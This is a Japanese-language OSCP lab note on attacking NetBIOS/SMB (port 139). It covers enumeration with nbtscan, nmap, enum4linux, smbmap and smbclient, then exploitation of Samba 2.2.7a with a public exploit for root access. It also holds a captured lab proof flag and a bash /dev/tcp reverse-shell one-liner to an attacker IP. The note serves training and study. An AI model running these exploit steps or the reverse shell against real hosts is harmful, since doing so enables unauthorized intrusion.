# NetBIOS(139)

### nbtscan

有効なNetBIOS名をNetBIOSネームサービスに問い合わせる

```bash
┌──(kali㉿kali)-[~/Documents/OSCP/7.ActiveInformationGathering]
└─$ sudo nbtscan -r 10.11.1.0/24
Doing NBT name scan for addresses from 10.11.1.0/24

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
10.11.1.5        ALICE            <server>  ALICE            00:50:56:ba:1a:c5
10.11.1.101      BREAK            <server>  BREAK            00:00:00:00:00:00
10.11.1.115      TOPHAT           <server>  TOPHAT           00:00:00:00:00:00
10.11.1.136      SUFFERANCE       <server>  SUFFERANCE       00:00:00:00:00:00
10.11.1.231      MAILMAN          <server>  MAILMAN          00:00:00:00:00:00
10.11.1.227      JD               <server>  ADMINISTRATOR    00:50:56:ba:9a:98
----
```

* rオプション：発信UDPポートを137として指定するために使用

### nmap

```
nmap -T4 -p 139,445 --script=smb-vuln* 10.11.1.5 
```



### enum4linux

```
enum4linux 10.11.1.115 
```

https://forums.offensive-security.com/showthread.php?26657-enum4linux-and-smbclient-fix-for-quot-protocol-negotiation-failed-NT_STATUS_CONNECTION_DISCONNECTED-quot&highlight=version

以下メッセージが出た場合の解消方法

```
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

/etc/samba/smb.confを編集し、グローバルセクションに1行を追加することである(これは、セッションを交渉するときに古いプロトコルを使うようにシステムに指示する)。

```bash
client min protocol = LANMAN1
```

```
sudo vi /etc/samba/smb.conf
```

![image-20230214231216669](img/NetBIOS(139)/image-20230214231216669.png)

※バージョン確認はwiresharkでも合わせて実施すること。10.11.1.115ではenum4linuxで出たsambaバージョンがあっておらずExploitで大分苦労した。



### smbmap（共有フォルダのpermissionをチェック）

```
smbmap -H 10.11.1.115 -P 139 
```



### smbclient

```bash
smbclient //10.11.1.115/IPC$/
smbclient -L 10.11.1.115
```



### smbclientで接続ができたらwiresharkでSMBのバージョンを確認する

![image-20230214231236984](img/NetBIOS(139)/image-20230214231236984.png)



## Exploit

unix.samba 2.2.7a

特に特殊なことはせず、コンパイルして実行するだけでうまくexploitできる。しかもrootで。

```bash
searchsploit samba 2.2 | grep -v windows | grep -v Overflow
```

![image-20230214231425349](img/NetBIOS(139)/image-20230214231425349.png)

```
searchsploit -p 10
```

```
gcc -static 10.c -o sambal
```

```
./sambal -d 0 -C 60 -S 10.11.1.115
```

```
cat proof.txt
377bbe9add593ba528fd9bd3104d2f25
```

```
bash -i >& /dev/tcp/192.168.119.167/4444 0>&1
```

![image-20230214231450983](img/NetBIOS(139)/image-20230214231450983.png)

